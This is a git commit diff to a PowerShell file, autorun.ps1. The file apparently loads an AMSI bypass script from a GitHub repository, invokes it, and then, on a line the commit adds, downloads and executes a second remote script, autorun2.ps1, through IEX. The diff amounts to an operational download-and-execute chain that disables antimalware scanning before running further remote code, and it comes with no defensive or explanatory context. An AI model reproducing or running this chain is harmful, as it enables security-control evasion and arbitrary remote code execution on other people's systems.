720f9c5189e177f8b486e18f69c52543a7dc1c1d
borari <33162660+borari@users.noreply.github.com>
2024-10-09 01:19:24 -0400

    Update autorun.ps1

--- autorun.ps1
+++ autorun.ps1
@@ -1,4 +1,4 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12;
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/ShorSec/AMS-BP/master/AMSBP.ps1');
 amsbp;
-
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/borari/temp/refs/heads/main/autorun2.ps1');
